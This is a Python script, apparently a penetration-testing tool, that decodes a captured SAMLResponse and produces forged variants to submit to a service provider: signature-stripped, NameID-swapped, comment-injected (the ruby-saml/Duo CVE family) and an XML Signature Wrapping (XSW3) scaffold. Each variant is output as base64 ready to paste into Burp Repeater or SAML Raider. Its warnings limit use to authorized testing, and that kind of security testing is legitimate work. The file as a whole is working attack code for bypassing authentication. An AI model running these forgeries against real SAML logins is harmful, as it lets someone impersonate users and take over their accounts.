#!/usr/bin/env python3
"""
saml_xsw.py - decode a captured SAMLResponse and emit tampered variants for signature/forgery testing (authorized only).

SAML security rests on the XML signature over the Assertion. This decodes a captured SAMLResponse and produces test
variants that catch broken verification:
  * signature-stripped   -> submit an assertion with NO <ds:Signature> and your NameID (SP that only "validates if present" forges)
  * nameid-swap          -> change NameID only, leave the (now-invalid) signature (tests: does the SP verify at all?)
  * comment-injection    -> NameID = victim<!---->x  (canonicalization/comment bug: Duo/ruby-saml/OneLogin CVE family)
  * xsw3-scaffold        -> a forged UNSIGNED assertion (your NameID, new ID) inserted as a sibling before the original
                            signed assertion (representative XML Signature Wrapping)

It does NOT re-sign (that needs the IdP key). For all 8 XSW patterns + automatic re-signing/cert edits use SAML Raider (Burp).
Each variant is printed as XML and as base64 (POST-binding ready). Submit via Repeater/SAML Raider and see if the SP accepts it.

SAFE: forge only to a NameID you are AUTHORIZED to impersonate (your own test user/admin). One login proof, then STOP.

Usage:
  python3 saml_xsw.py --response "$SAMLRESPONSE" --nameid admin@you.test
  python3 saml_xsw.py --file resp.xml --nameid admin@you.test --out ./variants
"""
import argparse, base64, re, sys, zlib, os

# namespace-prefix-agnostic element patterns (ds:Signature, saml2:Assertion, saml:NameID, ...)
SIG_RE = re.compile(r"<(\w+:)?Signature[\s>].*?</(\w+:)?Signature>", re.DOTALL)
ASSERTION_RE = re.compile(r"<(\w+:)?Assertion[\s>].*?</(\w+:)?Assertion>", re.DOTALL)
NAMEID_RE = re.compile(r"(<(\w+:)?NameID\b[^>]*>)(.*?)(</(\w+:)?NameID>)", re.DOTALL)
ASSERTION_ID_RE = re.compile(r"(<(\w+:)?Assertion\b[^>]*\bID=[\"'])([^\"']*)([\"'])")


def load(response_b64, file_path):
    if file_path:
        with open(file_path, "r", encoding="utf-8", errors="replace") as f:
            data = f.read()
        if data.lstrip().startswith("<"):
            return data
        response_b64 = data.strip()
    if not response_b64:
        sys.exit("[!] provide --response <base64> or --file <path>")
    raw = base64.b64decode(response_b64 + "=" * (-len(response_b64) % 4))
    # try raw first, then DEFLATE (redirect binding)
    try:
        txt = raw.decode("utf-8")
        if txt.lstrip().startswith("<"):
            return txt
    except Exception:
        pass
    try:
        return zlib.decompress(raw, -15).decode("utf-8")
    except Exception:
        return raw.decode("utf-8", errors="replace")


def strip_signature(xml):
    return SIG_RE.sub("", xml, count=0)


def swap_nameid(xml, new):
    def repl(m):
        return f"{m.group(1)}{new}{m.group(4)}"
    out, n = NAMEID_RE.subn(repl, xml)
    return out, n


def comment_inject(xml, new):
    def repl(m):
        return f"{m.group(1)}{new}<!---->x{m.group(4)}"
    out, n = NAMEID_RE.subn(repl, xml)
    return out, n


def xsw3_scaffold(xml, new):
    """Insert a forged, UNSIGNED assertion (new ID + your NameID, signature removed) as a sibling BEFORE the original
    signed assertion. Representative XSW; SPs that read the first/last assertion while validating the other are exposed."""
    m = ASSERTION_RE.search(xml)
    if not m:
        return xml, 0
    original = m.group(0)
    forged = strip_signature(original)
    forged, _ = swap_nameid(forged, new)
    forged = ASSERTION_ID_RE.sub(lambda mm: f"{mm.group(1)}_forged_xsw3_{mm.group(3)}{mm.group(4)}", forged, count=1)
    forged = f"<!-- forged unsigned assertion (XSW3 scaffold) -->{forged}"
    injected = xml[:m.start()] + forged + xml[m.start():]
    return injected, 1


def emit(name, xml, out_dir):
    b64 = base64.b64encode(xml.encode("utf-8")).decode()
    print(f"\n================ {name} ================")
    print(xml.strip()[:1600] + ("\n... [truncated] ..." if len(xml.strip()) > 1600 else ""))
    print(f"---- base64 (POST binding) ----\n{b64}")
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
        with open(os.path.join(out_dir, f"{name}.xml"), "w", encoding="utf-8") as f:
            f.write(xml)
        with open(os.path.join(out_dir, f"{name}.b64"), "w", encoding="utf-8") as f:
            f.write(b64)


def main():
    ap = argparse.ArgumentParser(description="SAMLResponse tamper/XSW variant generator (authorized only).")
    ap.add_argument("--response", help="base64 SAMLResponse (POST or redirect binding)")
    ap.add_argument("--file", help="path to a SAMLResponse file (XML or base64)")
    ap.add_argument("--nameid", required=True, help="NameID to forge - a value you are AUTHORIZED to impersonate")
    ap.add_argument("--out", help="directory to also write each variant (.xml + .b64)")
    a = ap.parse_args()

    xml = load(a.response, a.file)
    if not ASSERTION_RE.search(xml):
        print("[warn] no <Assertion> found - is this a SAMLResponse? proceeding on raw XML anyway.", file=sys.stderr)
    has_sig = bool(SIG_RE.search(xml))
    ncount = len(NAMEID_RE.findall(xml))
    print(f"[i] decoded XML: {len(xml)} chars | signature present: {has_sig} | NameID elements: {ncount}")
    if ncount == 0:
        print("[warn] no <NameID> matched - swaps will be no-ops; inspect the XML and adjust manually.", file=sys.stderr)

    v1 = strip_signature(xml)
    emit("1_signature_stripped", swap_nameid(v1, a.nameid)[0], a.out)

    v2, n2 = swap_nameid(xml, a.nameid)
    emit("2_nameid_swap_invalid_sig", v2, a.out)

    v3, n3 = comment_inject(xml, a.nameid)
    emit("3_comment_injection", v3, a.out)

    v4, n4 = xsw3_scaffold(xml, a.nameid)
    emit("4_xsw3_scaffold", v4, a.out)

    print("\n[i] Submit each via Repeater/SAML Raider. If the SP accepts a forged/stripped/wrapped assertion and logs you "
          "in as the NameID -> signature verification is broken (Critical ATO).")
    print("[i] For all 8 XSW patterns + automatic re-signing and cert/key-confusion edits, use SAML Raider (Burp).")
    print("[i] Forge only to a NameID you are authorized to impersonate. One login proof, then STOP.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
